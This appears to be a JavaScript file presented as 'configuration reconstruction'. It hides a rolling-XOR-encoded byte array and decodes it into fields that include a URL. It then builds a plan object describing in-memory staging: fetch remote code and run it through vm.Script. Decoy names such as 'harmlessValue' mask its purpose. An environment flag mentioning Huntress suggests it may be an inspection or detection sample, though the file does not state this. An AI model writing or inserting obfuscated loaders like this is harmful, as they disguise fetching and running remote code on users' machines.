// configuration reconstruction
const moduleShape = Object.freeze({ format: "commonjs" });
const Material_73fc31e4 = "[79,114,67,63,76,56,93,45,94,99,2,97,16,101,12,126,27,68,54,83,62,81,37,64,108,8,97,18,98,3,119,20,124,35,78,43,70,41,91,34,94,63,91,58,74,62,91,41,20,114,23,99,0,104,55,67,43,78,32,127,25,108,2,97,21,124,19,125,1,114,6,103,0,101,58,89,54,67,45,89,100,85,41,74,43,70,54,87,62,89,55,104,1,101,88,22,89,29,88,117,52,6,69,4,51,2,68,118,10,127,13,97,92,52,64,52,68,55,13,34,13,99,12,104,13,32,65,115,16,113,70,119,17,35,64,112,68,34,12,105,17,112,29,109,1,100,74,35,77,59,90,54,95,59,20,117,5,108,16,101,22,115,1,94,63,88,61,83,39,26,84,59,95,58,123,14,106,3,119,88,57,11,104,9]";
const Codec_73fc31e4 = "decimal_array|rolling_xor|39";

function load_73fc31e4() { return JSON.parse(Material_73fc31e4); }
function decode_73fc31e4(storedBytes) { let priorByte = 57; return storedBytes.map((value) => { const decoded = value ^ priorByte; priorByte = value; return decoded; }); }
async function recover_73fc31e4() {
  const harmlessValue = [3, 5, 8, 13].slice(1, 3);
  const storedBytes = load_73fc31e4(); let recoveredBytes = [];
  recoveredBytes = await Promise.resolve(storedBytes).then(decode_73fc31e4);
  void harmlessValue; return Buffer.from(recoveredBytes).toString("ascii");
}
async function inspect_73fc31e4() { return JSON.parse(JSON.stringify({ value: await recover_73fc31e4() })).value; }
async function plan_73fc31e4() { const inspect = inspect_73fc31e4; const fields = Object.fromEntries((await inspect()).split("|").map((field) => { const at = field.indexOf("="); return [field.slice(0, at), field.slice(at + 1)]; })); return Object.freeze({ operation: "memory-stage", transport: "fetch_then_function", url: fields.url, dispatch: "vm.Script" }); }
void moduleShape; void plan_73fc31e4;
if (process.env.HUNTRESS_INSPECT_ONLY === "1") console.log(await inspect_73fc31e4());

// reconstruction complete